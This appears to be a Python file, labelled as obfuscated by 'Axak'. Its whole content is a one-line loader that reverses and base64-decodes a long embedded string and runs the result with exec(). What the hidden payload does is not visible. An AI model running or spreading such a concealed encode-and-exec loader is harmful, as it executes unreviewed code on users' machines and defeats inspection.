# Obfuscated By Axak
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'pkyJahFaslVen9GW5t2bZlGZ3F2MstUWXh2RZhlTzZVbWV3TVRGWOhVU5lFbwNnUx8meU1GeXR1Moh0VqpVYSxmWh50VxgVVGB3VUhVTxImVSZ0YGZFahVlWxVVMwdnUsRmckZkVWRWMGlEVWRGMSFDc5ZFbklWTzIUWWNDcaJmRS90UtBHVUVEcYRVVkRjVWxmVSxmWsdlaWRXVWJ1TNZlSQJFbaZ1YqZlVXdFcvJ1VGplWFp1VTtmWxZlbndXTHJ1cW1GdYNWb4dFVVR3cNZkWKd1aa9UYXJlcVNjRPJ2RKpXZGZVYXdEaIVVbG9WYxolNTpmSXRFM1E3VVh2USFjSQVmRkdlTXdHeUVVOrJmRsdlTUJ0aWZEczZFSONlYXZFWRtGaXdVRJpXVs50QSdUS45URWN1UygHdXhFa2ZlVkhWYFpVYUVkWHRFVCNUYspVeVpmSoJGRFlnWEp1cNVVMY5kVWVVZXhzdVJDbLJlRwJlUsR2VjBTW6ZlVWBTTtJFVadEdWVmaoZlVtR3dhFDbZFWRotWVrVTcVVFdXJWRxgFVtBXVXhFa0ZlModVYx40MidEeplFVsRnVYxmRWtWMT1kVk90UwAHdaVlTv1kVah3UqJUVXdkUyZlaJBjUWRmejVEZhR2RoVXWsp0dixGZMZ1aa5UZFZUWWVEZLZFbW9kVsZFVO1GeXlVb0dnYGpVNXVlVVFWRwVUWrR3diVEMxYFVCZlVV92dWZEZHJ1RNJzVthHaTFDcHdFbs9WTt5UYNdVMVRlRahlVuB3dXZEbH5EVChGVsp1cVpnRzJ2RKNUYHVjVTV0b4RlVCtmVrFjRUxGZTNGMKlkVsx2SiZkTZd1aWpmTrBHWV1Gd3JVMwZEZGRGbW1WU4dFVNhnVVFjMUxmUVZ1MCdVWrVzThxWV4V1aad1Y6xmVWhkUhZVbG9UVthXVjpmVyplVk9WTGplSXtmWPZ1MShFVYRmTiZkW2JlaKpVZXRWSVFDcPZlRVhXTFZVaSpnVYZVRVFjVWxGUjdUNTdFSCNXWVlzQlxmWHFFbS9kVYJEdVNjTzJ2RGd0YHVDWSVVNYRlVOdkUHZ0MaZkWXF2MoZlVFZVYSxGZhFWRalmUF9WeZVVOrJGbSZ0YFZVVhJDazZFVGJlUsR2MXxGaaZlbohEVVVTYSZFcQZVbxkGVxo1RWxGa31kRSNHZGRmTlxmRYR1VFhnUWBXST1GePZlVKd0VrR2VSJjSyd1aSdlVrB3cWZEcDJ1ROZEVthHbRtmWxZlbsplVVVzUNZFZPJVV1gVVu50QNFjVZV2RxsWVsp1RZ5mVHZFbaBlTWZVYSVFcGZVMW9mUt1kMTxmWTV2R0hkVuZ1QixmUyR1aSF2UFVzRW1mRLZlVWNDZyETaVxmWzZVR0NlUxolehZkWYdVVJpXVxgWYSdlTa1UVWd1U6xmVX5WVxYlVKZlWHhHVVZUW5lFWo5kUGB3MipnRod1aaFXVwA3aWxWS3NGRCdlUwoUdadFbXJlVwhXVrR2Uj1GeZZFbo9kUwEzTNdVMU1EbadUWtlDNWFjWXNWRWd1VqZFSZVVOX1UbFFDVYBnWOxGcyZ1R4BjYWp0RaVkWTlVVwZlVYR2MidlSTZVb4V1UzI0RUVFZT1kRWpVTWZ1TUpmR0VVMjhnUWpFTPZlVhRGVWZVVsZ1aiZkTRZlaKhWZFFTRX5GZ210VGFmUtBHVT1mUXVlbwNUYspFNkBDZOFWMwZ0VtVUMWZlShpVRod1UHJVSadFbX10VRp3TVZFWjpnRyZFSKdkVG5UYjdUNSZVR0gXVrR2QhxmVxEVb1UFVwoUcVpmSa1UVxMjTXRnVStmWxllVJhnUyokUjVkWOJVMJdnVWh2UiZlRTNVbwZVZF9GeZdFdwIVMwZFZGRGbW1GazZFWKdVTtZ0MUZlUWdVVKlkVygHMWBTMHVlaGdFVwQDeWVFZr1UbSNnWFZFbSZlSYZVbG9mVsRWMjRkQTF2VSNnVrFFehFjWy5kVWFGZUZlVVxmVrJmROFlVqpEalVUMFdlbkZnYG5EUkdUMTJVV0gnVtR3SWZlVzQmMxkmVGp0cWhkQLZFMxwkYHhHWS1GeGpVV1AjVwQTeUVFZOVleWZlVzo0VhtWNWFWRaFWZrx2VZxmT3ZVMalXYGRGWWVkSFllbk9UTWpleOZFZWVWVsdFVXx2aWVVM4VlaK5UUw8GeWhFb6JFMxgFZFRGbjBjWzllbO9mVxwWShZEZYd1RRhXWzgmWWtWM6NFbaZ1Y6ZlRZxmSDFGbOZkWGpVaOVUNXZFSSdnVWp0VkVEZodlaGZUVykzahFDZJ5EVCRlYGp1RaRkRGZVMKBFZFRWYXdEaJplRw9kUG9meWxmWX1URJpnVWhGNiZlTVFVbwNlUVRDeW1GdLZlVWNDZyETaVxmWzZVR0dnUrFDSVpmQWdlRKRXVWp0QSdkSxIFbadFVzIkcWNDZaJlVKVlWEZkWNZkV0ZVb5skVGZ1VOdFdUlVVKFXVrZ1TNZlWyNFbWZFZzQGdZxmSXJmRSx0YFplTSFTS3ZlVoNlYWZ0URtmUpRWVadlVrlzdhFDZzcVVWNlVHJ1RXtmTHJ1axonTWRmVWpmVyVlMGNUYspkRUxmWX1URwZlVYR2MidlSTZVb4V1UxoEdZdVNvNlRalkYGp1TUxGcHlFWFVjUWRmeiVkWhN2VShkWWZ1aWZ1Y410R0dlYwoVVWZFb0YVMSh2YFRWaSVVNHZVMwNlVGJ1VhdUNpV1RoZUWsB3UidlR1FGROd1UHh3VUxmT0IlMGVzTFZ1USJDezZ1MGRTTspUWaVkVhFFMadEVY1UMWFjVX50V0RVWVpUcVtmVP1kVaJ3UsZlVkNDZIZlRKdlYGJFTjVkWOJVMaVkVrh2TSBTNzd1aahGZFlFeZVVO3JlVwl3VsZ1TWdVU3dFVCZkUrFjeT5GcVJlVwZlVHZ0dTdkRGR1aahVWVBnVXxmWvJWbKFlVtRXVTFTS5lVVkdlUGpVSUtGZPJmRwdUWYxmRSxGZ610V0h1YYJFSaZFavFWMkRkVsR2VORkVYZlVZFTYx4EaR1GcTJVV0gnVtR3SWZlVzQmMxkWVsp1cWVEdPJ2RWZnVuB3VTdEeXRFbOBjUyoUNVVFZOlFWCJnVzo0dWVVNWpFRCpVTFZ1RUhlTLJlRwNjYygHVZhlQIl1ao9kUsRGaU1GcWNmbohVWsJ0ViZEZoN2R4xmYtdmeWtGaPJFM1MlUrJFakRFbGV1akNnYGNmMhVEZTZ1RSd0Vr50VWFTWw4EVKVlUqZlcVJjRDFGbKZEVqZ0VhBDcWZFWkNjYXp0UW1GeVN1MCdEVVR2UNZkVXR1ao9EVsB3RZhVU1IlVahkYHhHWkFDbWRFbotmVWNGeSVlWONmMRpnVFp1dSxmUoFVbwNVTX1EeVxGcXZlRShVYHFTaV1GaHlFbwdnYHZkeaRkQWd1R4dFVrVTYS1mRwIlaGhGVzIkcWNjRwIlMWlVYGZFWNRkQyZVb4gXTsJ1VjdEeUF2MSRXVrZ1TNZlWyNFbWZFZzQGdZxmSXJmRSx0YFplTSFTS3ZlVoNlYWZ0URtmUpRVVadlVrlzdhFDZzcVVWNlVHJ1RXtmTHJ1axonTUpUVSZFcWZlMGd3UHZUSUpmRXFGMwZlVYR2MidlSTZVb4V1UzI0RUVFZT1kRWlVVtFjUVtmSFllbWdkVspFUjdEdYRWMsZUVsJ1aSxGcEJ1aa50Y6VUeWZkVhZlVkh2YEpEaOdUU4VVb0tkVWZ1MkJTMpVFbaNnVFR3dStWMIVlaCZ1VGpEdVZlSDJ1RKFjUsp1VUNTQ3ZFWkNjUy4UVaVkWp5EbaNHVWRWYNFDb0U1VxgFVxolcWNDbH1UVxQ0YGZlWXRUV3lFbkBjUxA3dSpmSoRWMJdnVYBnSNZlWUNVbwZVTrxGSVtWO3JVMwdVUtBHbX5mUIpFSGdkYFFDVjdUMYJleWZlVVVzbhFjR2Q1V4lmVxoUVWZUW1YFM1AlWGZlTShlQHRFWONlVsRGeOdFdVJGSShFV6JkTidlVI5kVWF2YsBnVVxGar10RFpnVsRWaVNzZ3ZlVjFjVXZ0TkZEZO1EbFhHVXlzdXZkUXJVbw9UVsp1cWZFcHJVMaR0VuB3VWxmS1VVMatkVG1EMVtmWYRGMKd1VrtGeSdlVWFWRapWUwA3cV1WODdlRSd0UthHaWVkSFlFbWNnYHZEROZlVhNWb4VEVtB3dixmSQZlaKhmUxk1dWtGaw0UbS9WZFRWaUVVNzZ1a5MnVxAXeS1GcPZVV1UUWUlFeWZlW0clVSZlVrB3VWJDaTJmRGd1YGp1VNhkQWZlbsZnVVVjVhVkWqVlVJlHVVVzbTZkWaFVb1IVVxAnRZh1Y4JlVONjUqpkWStmSJplRKtUZtVkeTxGZXVmRsZzVYhmSiZkUhRmRk9UTsZ0RWJDdPFGbsdEZGR2TXtGcVRVVWdkUxoFRhVkWXdVVKVnWWR2VWVVM3VVb4lGZ6ZlRX5GcS1UbOVVVrpVaTBzb5lVV5M0VGJVSS1GcVJGRWRnVFp1UNZlWM9kVWF2YrplNUdFdLJ1RWx0TWZ1Vj5WQ6ZlbKNlYt50URxmUPV2aVhnVuNGeSZFc1UVVkN1VrBXRaZFaLJWRxw0VtBXVWpnVWd1V0tmUXZlSjRkRTFGMwZlVYR2MidlSTZVb4V1UzI0RUVFZDdlRWZzUXRXaVtGcxVlaKpVTXZkdidUMaZlVwdUVtZ0UWZVS4NlVa5EZtJVSW5mUXZlRSNXTUp0aO1GezR1V0tkVWZ1MkJTMpVFbaNnVFR3dStWMIFFboZVZrxmcWxmTDJ1RSZjVrpVaiJDaYdFbotkVtJlVV1GdSdFRGJHVVR3SXZkW450V0hWYxo1VUZFc3JFbkNDVsZlVkNDZ0lFbKdlYGJFTjVkWOJVMJdnVWp1Ui1mUzRWRkpWZGZFSVtGZwEWMkZjTFZ1UWZkSzZFMSdUTspFTaZEaWNmeWZ1VXZ0Ql1WRyImRalWZFFjVWhFZzI2VKNlWFpVaSRlVWllaCNkYsRWWidEcsZFMaZTWYRmSNdlRYN2R0plVzI0RVFDawIlMRlnVsp1VNVkSZZVRWtkVWpFVWxmVY1UMJhXVqJEMNZkWIVmRkpmVuJEdVNjRT1UbGpXVqJkVl52Y5lVMOdkUH1UMNRlQXVGRCZ1VuZENSJjUTR1aSpWZqZkcUVVO3JGbahVVsRGahxGcyVFMwNlUs5kMW1GcWR2MNlnWGJ1diZlU3VVbxwmUyg2VWFjUPJlMO1kUspVUPdlTwd1V5IXZWhmdaNDbaJ2Rol1VpNGcLFVP9ciYokyXogyYlhXZ'))